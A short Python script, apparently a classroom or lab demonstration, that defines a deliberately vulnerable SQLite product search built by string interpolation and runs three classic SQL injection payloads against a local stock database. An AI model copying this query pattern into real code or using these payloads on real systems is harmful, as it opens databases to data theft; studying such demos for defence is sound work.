import sqlite3

conn = sqlite3.connect('nyondo_stock.db')

# Vulnerable search function
def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print("Query:", query)
    rows = conn.execute(query).fetchall()
    print("Result:", rows, "\n")
    return rows


# -------------------
# ATTACKS
# -------------------

print("Attack 1: Normal search")
search_product("Cement")

print("Attack 2: Dump all products (SQL Injection)")
search_product("' OR 1=1--")

print("Attack 3: Always true condition")
search_product("' OR '1'='1")

print("Attack 4: Try to break query")
search_product("anything' OR 'x'='x")